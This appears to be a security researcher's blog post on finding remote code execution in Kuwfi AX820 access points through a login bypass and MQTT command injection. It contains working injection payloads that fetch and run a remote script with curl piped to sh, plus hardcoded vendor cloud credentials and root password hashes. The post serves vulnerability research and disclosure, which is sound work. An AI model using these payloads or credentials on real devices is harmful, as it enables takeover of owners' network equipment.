---
layout: post
title: Finding RCE in access points by leveraging MQTT
date: 2024-05-20 08:00 +0200
categories: [vulnerability research, iot, mqtt]
img_path: /images/ax820
---

## Introduction

I was searching for a product like a home router or an access point (AP) that has not been audited yet.
My goals were to evaluate and improve my own tooling for vulnerability research on firmware and find and exploit bugs.

My scope was the administration web server and I discarded devices that had not the entire web server coded in C. So no Lua plugins, ASP or PHP servers. I discarded devices that have no firmware provided or had their firmware ciphered.

Finally I found this brand: [Kuwfi](https://kuwfi.com). Their products are availables on Amazon and the firmware is available [here](https://kuwfi.com/downloads/firmware-1).

![Kuwfi AX820](product_kuwfi_ax820.png){: w="700" h="400" }
_AX820 from Kuwfi_

## Grab the firmware and extract binaries

A firmware is available on this [page](https://kuwfi.com/downloads/firmware-1):

![Kuwfi firmware page](kuwfi_firmware_page.png)
_Kuwfi firmware page_

I said 'A' firmware because its the same for the three products (AX820, 5G03 and 2F01) but its actually the firmware for 2F01... I did not notice that at first but I've already bought it. Anyway let's extract the archive and find that web server binary.

Using carving with can extract the firmware :

```bash
➜  work binwalk -e KuWFI-2F01-2F01-CPE-V2.0-Build20240120143454-EN.ubin 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
48            0x30            uImage header, header size: 64 bytes, header CRC: 0xD13583A6, created: 2024-01-20 06:41:59, image size: 5243221 bytes, Data Address: 0x80000000, Entry Point: 0x803CA460, data CRC: 0xD9544DD9, OS: Linux, CPU: MIPS, image type: OS Kernel Image, compression type: lzma, image name: "Linux Kernel Image"
112           0x70            LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 8556248 bytes
```

Then extract data at offset 0x70:

```bash
➜  _KuWFI-2F01-2F01-CPE-V2.0-Build20240120143454-EN.ubin.extracted binwalk -e 70

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
1287262       0x13A45E        PGP RSA encrypted session key - keyid: 801000 2052480 RSA Encrypt-Only 1024b
4014184       0x3D4068        Linux kernel version 3.10.1
4030248       0x3D7F28        gzip compressed data, maximum compression, from Unix, last modified: 1970-01-01 00:00:00 (null date)
4097268       0x3E84F4        SHA256 hash constants, little endian
4098284       0x3E88EC        AES S-Box
4099084       0x3E8C0C        AES Inverse S-Box
4234940       0x409EBC        xz compressed data
4248944       0x40D570        Unix path: /lib/firmware/updates/3.10.14+
4385252       0x42E9E4        Unix path: /etc/Wireless/RT2860/RT2860.dat
4430416       0x439A50        XML document, version: "1.0"
4450872       0x43EA38        Unix path: /var/run/udhcpc.pid
4478582       0x445676        Neighborly text, "neighbor %.2x%.2x.%pM lost rename link %s to %s"
4605440       0x464600        CRC32 polynomial table, little endian
4681536       0x476F40        CRC32 polynomial table, little endian
4684736       0x477BC0        AES S-Box
5024212       0x4CA9D4        LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: -1 bytes
```

Finally firmware is at offset 0x4CA9D4, its a cpio archive, just extract it in an empty directory:

```bash
➜  _70.extracted cd fs
➜  fs cpio -idv < ../4CA9D4
home
sbin
sbin/poweroff
sbin/config-pptp.sh
sbin/makedevlinks.sh
sbin/udhcpc
sbin/config-l2tp.sh
sbin/cpubusy.sh
sbin/nat.sh
sbin/ntp.sh
sbin/wan.sh
sbin/gtd.sh
sbin/chpasswd.sh
sbin/checking_nvram.sh
sbin/affinity.sh
sbin/ifconfig
sbin/lsmod
sbin/internet.sh
sbin/run_top.sh
sbin/autoconn3G.sh
sbin/route
...
```

The init binary is a busybox symlink. According to the file /etc_ro/rcS we know that there is a lighthttpd server in this firmware.
The configuration file /etc_ro/lighttpd/lighttpd.conf teaches that the server is using mod_cgi: It contains all the endpoints and the binary that process it:

```conf
#### CGI module
cgi.assign                 = ( ".pl"  => "/usr/bin/perl",
                               ".cgi" => "",
                               "cgi-bin/login" => "/www/cgi-bin/login",
                               "cgi-bin/showhtml" => "/www/cgi-bin/showhtml",
                               "cgi-bin/sys_mamage" => "/www/cgi-bin/sys_mamage",
                               "cgi-bin/program_dict" => "/www/cgi-bin/program_dict",
                                "cgi-bin/wireless" => "/www/cgi-bin/wireless",
                                "cgi-bin/cloud" => "/www/cgi-bin/cloud",
                                "cgi-bin/wan" => "/www/cgi-bin/wan",
                                "cgi-bin/sys_dev" => "/www/cgi-bin/sys_dev",
                                "cgi-bin/setupwizard" => "/www/cgi-bin/setupwizard",
                                "cgi-bin/lan" => "/www/cgi-bin/lan",
                                "cgi-bin/clients" => "/www/cgi-bin/clients",
                                "cgi-bin/devmanage" => "/www/cgi-bin/devmanage",
                                "cgi-bin/producttest" => "/www/cgi-bin/producttest",
                                "cgi-bin/ac_service" => "/www/cgi-bin/ac_service",
                                "cgi-bin/firewall" => "/www/cgi-bin/firewall",
                                "cgi-bin/dev_info" => "/www/cgi-bin/dev_info",
                                "cgi-bin/dev_basic" => "/www/cgi-bin/dev_basic",
                                "cgi-bin/dev_client" => "/www/cgi-bin/dev_client",
                                "cgi-bin/dev_wan" => "/www/cgi-bin/dev_wan",
                                "cgi-bin/dev_lan" => "/www/cgi-bin/dev_lan",
                                "cgi-bin/dev_wireless" => "/www/cgi-bin/dev_wireless",
                                "cgi-bin/dev_wizard" => "/www/cgi-bin/dev_wizard",
                                "cgi-bin/dev_reboot" => "/www/cgi-bin/dev_reboot",
                                "cgi-bin/dev_pwd" => "/www/cgi-bin/dev_pwd",
                                "cgi-bin/dev_cloud" => "/www/cgi-bin/dev_cloud",
                                "cgi-bin/dev_login" => "/www/cgi-bin/dev_login",
                                "cgi-bin/dev_dict" => "/www/cgi-bin/dev_dict",
                                "cgi-bin/dev_ap_relay" => "/www/cgi-bin/dev_ap_relay",
                                "cgi-bin/dev_cpe_repeater" => "/www/cgi-bin/dev_cpe_repeater",
                                "cgi-bin/dev_cpe_manager" => "/www/cgi-bin/dev_cpe_manager",
                                ".sh"  => "")
```

In fact all of those files are symlink to **/www/cgi-bin/parentcgi**:

```bash
➜  _70.extracted ls -lha www/cgi-bin/
total 180K
drwxr-xr-x 2 ubuntu ubuntu 4,0K mai    6 14:52 .
drwxr-xr-x 6 ubuntu ubuntu 4,0K mai    6 14:52 ..
lrwxrwxrwx 1 ubuntu ubuntu    9 mai    6 14:52 ac_service -> parentcgi
lrwxrwxrwx 1 ubuntu ubuntu    9 mai    6 14:52 clients -> parentcgi
lrwxrwxrwx 1 ubuntu ubuntu    9 mai    6 14:52 cloud -> parentcgi
lrwxrwxrwx 1 ubuntu ubuntu    9 mai    6 14:52 dev_ap_relay -> parentcgi
lrwxrwxrwx 1 ubuntu ubuntu    9 mai    6 14:52 dev_basic -> parentcgi
lrwxrwxrwx 1 ubuntu ubuntu    9 mai    6 14:52 dev_client -> parentcgi
lrwxrwxrwx 1 ubuntu ubuntu    9 mai    6 14:52 dev_cloud -> parentcgi
lrwxrwxrwx 1 ubuntu ubuntu    9 mai    6 14:52 dev_cpe_manager -> parentcgi
lrwxrwxrwx 1 ubuntu ubuntu    9 mai    6 14:52 dev_cpe_repeater -> parentcgi
lrwxrwxrwx 1 ubuntu ubuntu    9 mai    6 14:52 dev_dict -> parentcgi
lrwxrwxrwx 1 ubuntu ubuntu    9 mai    6 14:52 dev_info -> parentcgi
lrwxrwxrwx 1 ubuntu ubuntu    9 mai    6 14:52 dev_lan -> parentcgi
lrwxrwxrwx 1 ubuntu ubuntu    9 mai    6 14:52 dev_login -> parentcgi
lrwxrwxrwx 1 ubuntu ubuntu    9 mai    6 14:52 devmanage -> parentcgi
lrwxrwxrwx 1 ubuntu ubuntu    9 mai    6 14:52 dev_pwd -> parentcgi
lrwxrwxrwx 1 ubuntu ubuntu    9 mai    6 14:52 dev_reboot -> parentcgi
lrwxrwxrwx 1 ubuntu ubuntu    9 mai    6 14:52 dev_wan -> parentcgi
lrwxrwxrwx 1 ubuntu ubuntu    9 mai    6 14:52 dev_wireless -> parentcgi
lrwxrwxrwx 1 ubuntu ubuntu    9 mai    6 14:52 dev_wizard -> parentcgi
lrwxrwxrwx 1 ubuntu ubuntu    9 mai    6 14:52 firewall -> parentcgi
lrwxrwxrwx 1 ubuntu ubuntu    9 mai    6 14:52 lan -> parentcgi
lrwxrwxrwx 1 ubuntu ubuntu    9 mai    6 14:52 login -> parentcgi
-rwxr-xr-x 1 ubuntu ubuntu 172K mai    6 14:52 parentcgi
lrwxrwxrwx 1 ubuntu ubuntu    9 mai    6 14:52 producttest -> parentcgi
lrwxrwxrwx 1 ubuntu ubuntu    9 mai    6 14:52 program_dict -> parentcgi
lrwxrwxrwx 1 ubuntu ubuntu    9 mai    6 14:52 setupwizard -> parentcgi
lrwxrwxrwx 1 ubuntu ubuntu    9 mai    6 14:52 showhtml -> parentcgi
lrwxrwxrwx 1 ubuntu ubuntu    9 mai    6 14:52 sys_dev -> parentcgi
lrwxrwxrwx 1 ubuntu ubuntu    9 mai    6 14:52 sys_mamage -> parentcgi
lrwxrwxrwx 1 ubuntu ubuntu    9 mai    6 14:52 wan -> parentcgi
lrwxrwxrwx 1 ubuntu ubuntu    9 mai    6 14:52 wireless -> parentcgi
```

Thus **parentcgi** becomes our main target.

## Reversing parentcgi

I'm looking for the place where those endpoints are registered, something like handlers that are linked with their route. (eg: register("/login", login_handler))
I'm also wondering how they share HTTP parameters between server and parentcgi binary because this will be our inputs.

### Searching for endpoints handlers

`main` function shows that the name of the binary is compared to the value of a string and a corresponding handler is called:

![Parentcgi's main](parentcgi_main.png)
_Parentcgi's main function_

Endpoints' strings and their corresponding handler are in data section. Note that Ghidra did not automatically create function for most of them.

Only the first handler is recognized by Ghidra as a function, others aren't:

![A handler that is not identified as a function by Ghidra](listing_endpoint_handler.png)
_A handler that is not identified as a function by Ghidra_

So I had to create a script to create functions and rename those functions after the name of the endpoints:

```python
from ghidra.program.model.listing import Function
from ghidra.program.model.symbol import SourceType


def bytes_to_string(data) -> str:
    chars = [chr(b) for b in data if b != 0]
    return "".join(chars)


def rename_vulnerable_sources() -> list[str]:
    # see main
    func_ptr_addr, func_ptr_off, str_addr, str_off = 0x438884, 0x38, 0x438850, 0x38
    endpoints: list[str] = []
    for i in range(0x1e):
        # get the endpoint name
        endpoint = bytes_to_string(getBytes(toAddr(str_addr + i * str_off), 30))  # never exceed 30
        endpoints.append(endpoint)
        print(f"[+] Endpoint: {endpoint}")

        # get the function pointer
        func_addr = getInt(toAddr(func_ptr_addr + i * func_ptr_off))
        print(f"[+] Renaming function at: {func_addr:x}")
        fun: Function = getFunctionAt(toAddr(func_addr))

        # create function if it does not already exist else just rename it
        if not fun:
            fun = createFunction(toAddr(func_addr), endpoint)
            if not fun:
                print(f"[-] Could not create function {endpoint}@{func_addr:x}")
                return []
        else:
            fun.setName(endpoint, SourceType.USER_DEFINED)
    return endpoints


def main():
    sources = rename_vulnerable_sources()  # rename
    print(sources)


if __name__ == "__main__":
    main()
```

Note that i'm using the plugin Ghidrathon to use Python3 for Ghidra.

Here is the result (Ghidra symbol table):

![Ghidra symbol table with all our renamed functions, user defined](parentcgi_symbol_table.png)
_Ghidra symbol table with all our renamed functions, user defined_

All handlers are clearly identified and disassembled.

### User inputs

All inputs comes from functions like `getenv`, `getprop`, `get_token`, `get_content_from_querystring`.

- `getenv` is used to retrieve the value of the environnement variables _REMOTE_ADDR_, _HTTP_AUTHORIZATION_ and _REQUEST_METHOD_. It is used to extract the HTTP query parameters from the other functions.

- `getprop` is used to retrieve requests parameters such as _stork_, _opcode_ and _funame_. _stork_ is the authentication token, _opcode_ and _funame_ are unsiged integers that are used by handlers to choose what to do. I show example of request after this paragraph. It hides a call to  `getenv("QUERY_STRING")`.

- `get_token` is used to extract the token (_stork_). I suppose the programmers expected to use others tokens but here it is used only with the `stork=` parameter. It extract the token from a call to `getenv("HTTP_COOKIE")` and if it does not work `getenv("QUERY_STRING")`.

- `get_content_from_querystring` is similar to getprop. In fact the _query string_ comes from a call to `getenv("QUERY_STRING")`.

The curl command below shows how to get information from the AP using the endpoint _/sys_dev_. _funname_ must be 9 and _action_ must be 2.

```bash
➜  ~ curl -X POST http://192.168.188.253/cgi-bin/sys_dev -d 'funname=9&action=2'
{"PRODUCTNAME":"AX820","CHIPTYPE":"MTK7915","LANG":"en","FIRMVERSION":"AX820-AP-V3.0-Build20231012104019","HWVERSION":"V1.2","SN":"","SWVERSION":"V1.0","OPMODE":"3","PSMODE":"255","NAME":"","IS_FIRST":"1","FIT_TO_FAT":"0","TESTMODE":"0","CHECK_MAC":"1"}
```

Note that **each endpoint handler is responsible for its authentication**.

## Discovering broken authentication

When I received the AP I confirm my analysis even though the firmware is for 2F01 (CPE) and not AX820.
I also saw that there is a default telnet access on port 23. I tried the credentials found in the firmware in /etc_ro/rcS: `admin:476t*_f0%g09y`. It didn't work for AX820.

Using burp I went through the whole UI. Turns out that `/login` endpoints grant a token (stork) when user provides good credentials through username and password HTTP parameters.

It turns out that when you skip both parameters, you also get a valid authentication token as you can see below:

**Normal use providing credentials admin:love**:

![Authentication with credentials](parentcgi_login_with_creds.png)
_Authentication with credentials, getting a token_

**Authenticate without providing any credentials (removing parameters username and password)**:

![Authentication with credentials](parentcgi_login_no_creds.png)
_Authentication without credentials, getting a token_

The reason for that is an unecessary call to `generate_token2save` in the login handler:

![Useless call to generate_token2save](parentcgi_login_generate_token.png)
_Useless call to generate_token2save_

## Searching for RCE in the binary

I searched for vulnerable calls in the binary but the behaviour I had was not consistent with my expectation. May be due to the difference in the firmware. So I needed an shell on the device.

At this point I decicded to search a way to gain code execution on the AP. I can not use telnet as I don't have the credentials of my AX820. So I decided to use my physical access using UART and a USB adapter (ft232):

![Connecting UART to computer](ax820_ft232.jpg)
_Connecting UART to computer using adapter_

I can access logs and even get a prompt to authenticate:

![Boot logs and login](ax820_boot_logs.png)
_Can see logs but cannot authenticate_

But again I don't have credentials to authenticate. If I press a key quickly during boot (before the kernel image is loaded), I get a _mtkautoboot_ shell but I don't manage to take advantage of it and I did not investigated it further:

![mtkautoboot menu](ax820_mtkautoboot.png)
_mtkautoboot menu_

So, I cannot authenticate and AX820 is using mtkautoboot so I can't just change the kernel command line to bypass login. I decide to come back here if I don't find anything else.

Finally I notice that I could update the cloud server as I wanted. At first I completely ignored that because I thought it could be complicated to behave as a cloud server. Turns out it was not.

## Cloud server

The endpoint `cloud` allows to update the cloud server with not limitation. By default cloud server is not enabled and the default server is: <iot.yowifi.net>.

The file /etc_ro/defconfig/def_misc.conf contains credentials to authenticate to this server.

```conf
...
sys_cloud.server="iot.yowifi.net"
...
sys_cloud.user_name="yuncorelot"
sys_cloud.user_pwd="eufhja*@2756_hja"
sys_cloud.appid="325986ac102df6261ca5fbfbc2aa3458"
sys_cloud.appsecret="fbcb84MxLNDndnWCWZ08TXIj9ePbBp8lHVp9rBXy"
sys_cloud.productid="prtxaejlnqrtdezxbyampdmrw"
...
```

There is a binary that handle the cloud interactions: `/bin/cloud-client`.

At first, I changed the binary cloud server to my address and I started a netcat listener. Here is what I got:

```bash
➜  ~ nc -lvp 8000
Listening on 0.0.0.0 8000
Connection received on 192.168.188.253 35996
POST /cloudnetlot/backend/getclient HTTP/1.1
Host: 192.168.188.182:8000
Accept: */*
Content-Type:application/json
Content-Length: 173

{"appid":"325986ac102df6261ca5fbfbc2aa3458","secret":"fbcb84MxLNDndnWCWZ08TXIj9ePbBp8lHVp9rBXy","prtid":"prtdaxkypywtbwvarlgepmqvr","mac":"7C:27:3C:00:94:45","type":"AX820"}
```

If I forward this request to <iot.yowifi.net>, the server responds with:

```bash
➜  ~ curl https://iot.yowifi.net/cloudnetlot/backend/getclient -H "Content-Type: application/json" -d '{"appid":"325986ac102df6261ca5fbfbc2aa3458","secret":"fbcb84MxLNDndnWCWZ08TXIj9ePbBp8lHVp9rBXy","prtid":"prtdaxkypywtbwvarlgepmqvr","mac":"7C:27:3C:00:94:45","type":"AX820"}'
{"status":10000,"data":{"protocol":"v1.0","prtid":"prtdaxkypywtbwvarlgepmqvr","cltid":"cltdwdrsru9x44eo6gmrebvp8ldkkn","server_protocol":"mqtt","server":"1.85.2.93","port":"9096","encode":{"type":"1"},"now":"1715545532"},"errorCode":[]}%
```

The field server seems to be some identifier or version but it is used by the cloud-client binary as a MQTT server.

So all we have to do get a MQTT request is to create a web server that respond the previous JSON but with our IP in the field server and our port in the field port.

## Cloud-client binary

MQTT a protocol that allows a broker (or MQTT server) to create topics. A topic is a path-like resource such as `/aaa/bbb/ccc`. A broker can do access control over those resources.

Once authenticated, a MQTT client can **publish** data to the topic (write) and **suscribe** data from the topic (read).

User (AX820) authenticate using credentials `yuncorelot:eufhja*@2756_hja`.

Topics and data read from topics is what matters. The AP may be administrated remotely leading to RCE.

Topics names can be extracted from the first function executed in the loop in the main function. In fact this function handles all the HTTP exchanged with the cloud server described above. Topics are defined using _prtid_ and _cltid_ according to this function:

![Building topics strings](cloud_loop_topics.png)
_Building topics strings_

So In our case prtid is prtdaxkypywtbwvarlgepmqvr and cltid is defined by the server so we can use any string. If I choose cltid=somecltid then our topics are:

- `/cltdwdrsru9x44eo6gmrebvp8ldkkn/somecltid/dev2app`: AP publishes data.
- `/cltdwdrsru9x44eo6gmrebvp8ldkkn/somecltid/app2dev`: AP receives command.
- `/cltdwdrsru9x44eo6gmrebvp8ldkkn/somecltid/auth`: ?

Then what data are processed by the AP? When a client suscribe to a topic, it has to provide a callback that is executed every time a message is received using `mosquitto_message_callback_set`. That's our target:

![Message callback](cloud_message_callback.png)
_Message callback_

The disassembled code is very huge (2100 lines of conditional statements) nonetheless JSON functions and log statements are easy to follow and make it easy to guess what data are expected (JSON data by the way). For example:

![Lines from cloud message callback](cloud_message_example.png)
_Lines from cloud message callback_

Those lines means that the binary expects a `command` key that contains a object with a `type` key:

```JSON
{"command": 
    {
        "type": "..."
        ...
    }
}
```

Now It is time to find RCE. There is obvious code execution within the message callback:

![Vulnerable call to do_system in message callback](cloud_message_callback_do_system.png)
_Vulnerable call to do_system in message callback_

To reach those statements and execute any command, all I need to do is send this JSON payload.

```json
{
    "now": "1715718611",
    "body": {
        "command": {
            "type": "set",
            "auth": [
                {
                    "radioid": "",
                    "status": "0",
                    "clientmac": ";curl 192.168.188.182:8080/sh|sh;"
                }
            ]
        }
    }
}
```

Note that this ends up in the "if" statement.

There is a similar vulnerability in the upgrade command:

![Code injection in upgrade command](cloud_message_callback_do_upgrade.png)
_Code injection in upgrade command_

Here is the payload:

```json
{
    "now": "1714350566",
    "body": {
        "command": {
            "type": "upgrade",
            "url": ";curl 192.168.188.182:8080/sh|sh;",
            "signature": "abcd",
            "wait": "1",
            "orderid": "abcd"
        }
    }
}
```

So the process to obtain code execution on the AP is the following:

0. Start webserver and MQTT broker locally.
1. Update cloud server using a token obtained exploiting the broken authentication.
2. Provide our MQTT server during the exchange with our fake cloud server.
3. At this point the access point is authenticated to our MQTT server. Use another MQTT client (or the same account) to publish payloads and execute commands.

## Demonstration

All the code is on my [Github repository](https://github.com/willboka/AX820-remote-code-execution).

![RCE exploiting set command](ax820_rce_demo.png)
_Getting a reverse shell using 'set' command_

Here we receive a shell after performing all the steps described in [README.md](https://github.com/willboka/AX820-remote-code-execution). The RCE used here is the command injection in the "set" command.

By the way, the password is no longer in clear text on AX820 but in a hashed form. I quickly tried to break it using rockyou.txt and _john_ but nothing matched. Anyway I don't need it anymore. Here it is if you want to crack it:

In /etc/:

```bash
/ # cat etc/passwd
root:x:0:0:root:/root:/bin/ash
daemon:*:1:1:daemon:/var:/bin/false
ftp:*:55:55:ftp:/home/ftp:/bin/false
network:*:101:101:network:/var:/bin/false
nobody:*:65534:65534:nobody:/var:/bin/false
mosquitto:x:200:200:mosquitto:/var/run/mosquitto:/bin/false
http:x:100:100:http:/var/run/http:/bin/false
/ # cat etc/shadow
root:$1$7Kq3p1CM$ZdhylUeqRd1vcvNEQqzpK/:19863:0:99999:7:::
daemon:*:0:0:99999:7:::
ftp:*:0:0:99999:7:::
network:*:0:0:99999:7:::
nobody:*:0:0:99999:7:::
mosquitto:x:0:0:99999:7:::
http:x:0:0:99999:7:::
```

In /rom/etc/:

```bash
/ # cat ./rom/etc/passwd
root:x:0:0:root:/root:/bin/ash
daemon:*:1:1:daemon:/var:/bin/false
ftp:*:55:55:ftp:/home/ftp:/bin/false
network:*:101:101:network:/var:/bin/false
nobody:*:65534:65534:nobody:/var:/bin/false
mosquitto:x:200:200:mosquitto:/var/run/mosquitto:/bin/false
/ # cat ./rom/etc/shadow
root:$1$oUWwRa3Y$tRlUvBRoRL17Ryhf92emi1:18418:0:99999:7:::
daemon:*:0:0:99999:7:::
ftp:*:0:0:99999:7:::
network:*:0:0:99999:7:::
nobody:*:0:0:99999:7:::
mosquitto:x:0:0:99999:7:::
```

## Final thoughts

That's intriguing to see MQTT used for remote administration in such devices. I thought it would be employed to gather statistics but not for sensitive commands like _upgrade_.
The web server was difficult to exploit directly has I gained no access to the filesystem of the product but the fact that it allows to update the cloud server URL moves the research on another binary that is less dense, easier to "map" (as we have to look exclusively for MQTT related functions) and less secure.
There are definitely many other bugs on the device, but I decided to stop there. At the time of publishing I reported the vulnerabilities more than three weeks ago to Kuwfi and Yuncore, no response.
